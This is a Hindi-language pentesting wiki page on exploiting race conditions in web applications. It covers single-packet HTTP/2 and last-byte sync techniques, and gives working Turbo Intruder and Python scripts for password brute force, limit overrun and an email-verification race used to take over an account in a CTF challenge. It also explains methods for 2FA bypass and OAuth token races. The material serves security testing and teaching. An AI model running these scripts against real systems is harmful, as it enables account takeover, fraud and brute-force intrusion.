# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> इस तकनीक की गहन समझ प्राप्त करने के लिए मूल रिपोर्ट देखें [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Race Condition हमलों को बेहतर बनाना

race conditions का फायदा उठाने में मुख्य बाधा यह सुनिश्चित करना है कि कई requests एक ही समय में संसाधित हों, और उनके प्रोसेसिंग टाइम में **बहुत कम अंतर — आदर्श रूप से 1ms से कम** हो।

यहाँ आप Requests को सिंक्रोनाइज़ करने के लिए कुछ तकनीकें पा सकते हैं:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: एकल TCP कनेक्शन पर दो requests भेजने का समर्थन करता है, जिससे network jitter का प्रभाव कम होता है। हालांकि, server-side विविधताओं के कारण, दो requests एक स्थिर race condition exploit के लिए पर्याप्त नहीं हो सकते।
- **HTTP/1.1 'Last-Byte Sync'**: 20-30 requests के अधिकांश हिस्सों को पहले ही भेजने में सक्षम बनाता है, एक छोटा सा fragment रोका जाता है, जिसे फिर साथ में भेजा जाता है, जिससे server पर एक साथ आगमन हासिल होता है।

**Preparation for Last-Byte Sync** में शामिल हैं:

1. headers और body डेटा को अंतिम byte को छोड़कर भेजना, stream को समाप्त किए बिना।
2. प्रारंभिक भेजने के बाद 100ms के लिए रुकना।
3. अंतिम frames को बैच करने के लिए TCP_NODELAY को disable करना ताकि Nagle's algorithm का उपयोग हो सके।
4. कनेक्शन को warm up करने के लिए ping करना।

बाद में रोके गए frames को भेजने पर उनका आगमन एक single packet में होना चाहिए, जिसे Wireshark के जरिए verify किया जा सकता है। यह विधि static files पर लागू नहीं होती, जो आमतौर पर RC attacks में शामिल नहीं होते।

### Server Architecture के अनुसार अनुकूलन

लक्ष्य की architecture को समझना महत्वपूर्ण है। Front-end servers requests को अलग तरीके से route कर सकते हैं, जिससे timing प्रभावित होती है। महत्वहीन requests के जरिए preemptive server-side connection warming request timing को सामान्य कर सकता है।

#### Handling Session-Based Locking

PHP जैसे frameworks का session handler सत्र के अनुसार requests को serialize करते हैं, जिससे संभावित vulnerabilities छिप सकती हैं। हर request के लिए अलग session tokens का उपयोग इस समस्या को circumvent कर सकता है।

#### Overcoming Rate or Resource Limits

यदि connection warming प्रभावी नहीं है, तो dummy requests के बाढ़ के जरिए web servers के rate या resource limits द्वारा देरी पैदा करने के लिए जानबूझकर trigger करना single-packet attack को सुगम बना सकता है, क्योंकि यह server-side delay उत्पन्न करता है जो race conditions के अनुकूल होता है।

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: आप request को **Turbo intruder** को भेज सकते हैं (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), आप request में उस value को बदल सकते हैं जिसे आप brute force करना चाहते हैं **`%s`** जैसे `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` और फिर drop down से **`examples/race-single-packer-attack.py`** चुनें:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

यदि आप अलग-अलग values भेजने जा रहे हैं, तो आप code को इस तरह modify कर सकते हैं जो clipboard से एक wordlist का उपयोग करता है:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> अगर वेब HTTP2 को सपोर्ट नहीं करता (केवल HTTP1.1) तो `Engine.THREADED` या `Engine.BURP` का उपयोग `Engine.BURP2` की बजाय करें।

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: यदि आपको 1 endpoint पर एक request भेजनी हो और फिर RCE ट्रिगर करने के लिए अन्य endpoints पर कई requests भेजनी हों, तो आप `race-single-packet-attack.py` script को कुछ इस तरह बदल सकते हैं:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- यह **Repeater** में भी उपलब्ध है, Burp Suite के नए '**Send group in parallel**' विकल्प के माध्यम से।
- **limit-overrun** के लिए आप समूह में **उसी अनुरोध को 50 बार** जोड़ सकते हैं।
- **connection warming** के लिए आप समूह के **beginning** में web server के किसी non static हिस्से के लिए कुछ **requests** जोड़ सकते हैं।
- दो उप-स्टेट्स वाले चरणों में एक अनुरोध और अगले अनुरोध के प्रोसेसिंग के **between** प्रक्रिया को **delaying** करने के लिए, आप दोनों अनुरोधों के बीच अतिरिक्त **requests** जोड़ सकते हैं।
- एक **multi-endpoint** RC के लिए आप वह **request** भेजना शुरू कर सकते हैं जो **goes to the hidden state**, और उसके तुरंत बाद उस छिपे हुए स्टेट को **exploits the hidden state** करने वाले **50 requests** भेज सकते हैं।

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: इस स्क्रिप्ट का उद्देश्य एक उपयोगकर्ता का email बदलना है और लगातार उसे verify करते रहना है जब तक नए email का verification token अंतिम email पर नहीं पहुँच जाता (कोड में ऐसा RC देखा गया था जहाँ email को संशोधित किया जा सकता था लेकिन verification पुराने ईमेल पर भेज दिया जाता था क्योंकि email सूचित करने वाला variable पहले वाले से पहले ही populated था)।\
जब प्राप्त ईमेल्स में शब्द "objetivo" पाया जाता है तो हमें पता चलता है कि हमने बदले गए ईमेल का verification token प्राप्त कर लिया है और हम हमला समाप्त कर देते हैं।
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Single Packet Attack में सुधार

मूल रिसर्च में समझाया गया है कि इस attack की सीमा 1,500 bytes है। हालांकि, [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) में बताया गया है कि IP layer fragmentation का उपयोग करके single packet attack की 1,500-byte सीमा को TCP की 65,535 B window limitation तक बढ़ाना संभव है (एक single packet को कई IP packets में विभाजित करना) और उन्हें अलग-अलग क्रम में भेजना, जिससे तब तक packet का पुनः संयोजन रोका जा सकता है जब तक सभी fragments server तक न पहुँच जाएँ। इस तकनीक ने researcher को लगभग 166ms में 10,000 requests भेजने की अनुमति दी।

ध्यान दें कि हालांकि यह सुधार उन RC मामलों में attack को अधिक reliable बनाता है जिनमें सैकड़ों/हज़ारों packets को एक साथ पहुँचने की आवश्यकता होती है, इसके कुछ software सीमाएँ भी हो सकती हैं। कुछ लोकप्रिय HTTP servers जैसे Apache, Nginx और Go में `SETTINGS_MAX_CONCURRENT_STREAMS` सेटिंग कड़ाई से 100, 128 और 250 पर होती है। हालांकि, अन्य जैसे NodeJS और nghttp2 में यह unlimited है.\
इसका मूल मतलब है कि Apache केवल एक single TCP connection से 100 HTTP connections ही स्वीकार करेगा (जो इस RC attack को सीमित करता है)।

आप इस तकनीक का उपयोग करने वाले कुछ उदाहरण इस repo में पा सकते हैं: https://github.com/Ry0taK/first-sequence-sync/tree/main

## Raw BF

पिछले research से पहले कुछ ऐसे payloads उपयोग किए जाते थे जो केवल packets को जितनी जल्दी हो सके भेजने की कोशिश करते थे ताकि RC पैदा हो सके।

- **Repeater:** पिछले सेक्शन के उदाहरण देखें।
- **Intruder**: **request** को **Intruder** पर भेजें, **Options menu** के अंदर **number of threads** को **30** पर सेट करें, payload के रूप में **Null payloads** चुनें और **30** जनरेट करें।
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

यह race condition का सबसे बुनियादी प्रकार है जहाँ **vulnerabilities** उन जगहों पर **प्रकट** होते हैं जो किसी कार्रवाई को करने की संख्या को **सीमित** करते हैं। उदाहरण के लिए किसी वेब स्टोर में एक ही डिस्काउंट कोड को कई बार उपयोग करना। एक बहुत ही साधारण उदाहरण [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) या [**this bug**](https://hackerone.com/reports/759247)**.**

इस प्रकार के हमले के कई रूप हैं, जैसे:

- एक gift card को कई बार redeem करना
- किसी उत्पाद को बार-बार रेट करना
- अपने account balance से अधिक राशि withdraw या transfer करना
- एक ही CAPTCHA solution को reuse करना
- Bypassing an anti-brute-force rate limit

### **Hidden substates**

कठिन race conditions का फायदा अक्सर उन छोटे समय-खिड़कियों में उठाया जाता है जहाँ आप hidden या **unintended machine substates** के साथ इंटरैक्ट कर सकते हैं। इस तरह से आगे बढ़ें:

1. **Identify Potential Hidden Substates**
- शुरुआत उन endpoints की पहचान से करें जो critical डेटा जैसे user profiles या password reset प्रक्रियाओं को modify या interact करते हैं। ध्यान दें:
- **Storage**: उन endpoints को प्राथमिकता दें जो server-side persistent data को manipulate करते हैं, न कि उनपर जो client-side data संभालते हैं।
- **Action**: ऐसे operations खोजें जो मौजूदा डेटा को बदलते हैं — नए डेटा जोड़ने की तुलना में ऐसे ऑपरेशन exploit करने के लिए अधिक संभावित होते हैं।
- **Keying**: सफल हमलों में आम तौर पर वही identifier उपयोग होता है, जैसे username या reset token।
2. **Conduct Initial Probing**
- पहचाने गए endpoints पर race condition हमले करके टेस्ट करें और अपेक्षित परिणामों से किसी भी विचलन को observe करें। अप्रत्याशित responses या एप्लिकेशन व्यवहार में बदलाव vulnerability का संकेत दे सकते हैं।
3. **Demonstrate the Vulnerability**
- हमले को exploit करने के लिए आवश्यक न्यूनतम अनुरोधों की संख्या तक सीमित करें, अक्सर बस दो। इस चरण में precise timing के कारण कई प्रयास या automation की आवश्यकता हो सकती है।

### Time Sensitive Attacks

अनुरोधों के समय में सटीकता vulnerabilities उजागर कर सकती है, खासकर जब security tokens के लिए timestamps जैसे predictable तरीके उपयोग किए गए हों। उदाहरण के लिए, timestamp पर आधारित password reset tokens simultaneous requests के लिए identical tokens पैदा कर सकते हैं।

To Exploit:

- सटीक timing का उपयोग करें, जैसे single packet attack, एक साथ password reset requests करने के लिए। identical tokens vulnerability का संकेत हैं।

Example:

- एक ही समय पर दो password reset tokens request करें और उनकी तुलना करें। यदि tokens मेल खाते हैं तो यह token generation में दोष का संकेत है।

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Hidden substates case studies

### Pay & add an Item

Check this [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) to see how to **pay** in a store and **add an extra** item you that **won't need to pay for it**.

### Confirm other emails

विचार यह है कि एक ही समय पर किसी email address को verify किया जाए और उसे किसी दूसरे email में change किया जाए ताकि पता चल सके कि प्लेटफ़ॉर्म नए email को verify करता है या नहीं।

### Change email to 2 emails addresses Cookie based

According to [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab इस तरीके से takeover के लिए vulnerable था क्योंकि यह संभवतः एक email का email verification token दूसरे email पर **send** कर सकता था।

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

यदि किसी database में जानकारी जोड़ने के लिए **2 different writes** उपयोग किए जाते हैं, तो एक छोटा सा समय-खिड़की होता है जहाँ केवल पहला डेटा ही database में लिखा गया होता है। उदाहरण के लिए, user बनाते समय पहले **username** और **password** लिखे जा सकते हैं और उसके बाद newly created account को confirm करने के लिए token लिखा जा सकता है। इसका अर्थ है कि एक छोटे समय लिए account confirm करने का **token null** हो सकता है।

इसलिए एक account register करना और तुरंत account confirm करने के लिए खाली token के साथ कई requests भेजना (`token=` या `token[]=` या कोई अन्य variation) c**onfirm an account** की अनुमति दे सकता है जहाँ आप email को control नहीं करते।

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

The following pseudo-code is vulnerable to race condition because in a very small time the **2FA is not enforced** while the session is created:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 की शाश्वत स्थिरता

कई [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers) मौजूद हैं। ये सेवाएँ आपको एक application बनाने और उन users को authenticate करने की अनुमति देती हैं जिन्हें provider ने रजिस्टर किया है।  
ऐसा करने के लिए **client** को **permit your application** करके **OAUth provider** के अंदर उनके कुछ डेटा तक पहुँच की अनुमति देनी होगी।\
तो, अब तक यह बस google/linkedin/github... के साथ एक सामान्य लॉगिन है, जहाँ आपको एक पेज दिखता है जिस पर लिखा होता है: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

समस्या तब उभरती है जब आप इसे **accept it** करते हैं और यह स्वचालित रूप से एक **`authorization_code`** malicious application को भेज देता है। फिर यह **application abuses a Race Condition in the OAUth service provider to generate more that one AT/RT** (_Authentication Token/Refresh Token_) आपके account के लिए **`authorization_code`** से। मूलतः, यह इस तथ्य का दुरुपयोग करता है कि आपने application को आपके डेटा तक पहुँच देने की अनुमति दी है ताकि यह **create several accounts** कर सके। यदि आप बाद में application को आपके डेटा तक पहुँच देना बंद कर देते हैं तो एक जोड़ी AT/RT हटाई जा सकती है, लेकिन अन्य जोड़ीयाँ अभी भी valid रहेंगी।

#### Race Condition in `Refresh Token`

एक बार जब आप एक valid RT प्राप्त कर लेते हैं, तो आप इसे abuse करके कई AT/RT जनरेट करने की कोशिश कर सकते हैं और यहाँ तक कि यदि user malicious application के permissions रद्द कर दे, तब भी कई RTs valid बने रह सकते हैं।

## **RC in WebSockets**

- [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) में आप Java में एक PoC पा सकते हैं जो websocket messages को parallel में भेजकर Web Sockets में भी Race Conditions का दुरुपयोग करता है।
- Burp’s WebSocket Turbo Intruder के साथ आप **THREADED** engine का उपयोग करके multiple WS connections spawn कर सकते हैं और payloads parallel में भेज सकते हैं। आधिकारिक उदाहरण से शुरू करें और concurrency के लिए `config()` (thread count) को tune करें; जब server‑side state को WS handlers के पार race करना हो तो यह अक्सर एक single connection पर batching से अधिक reliable होता है। देखें [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
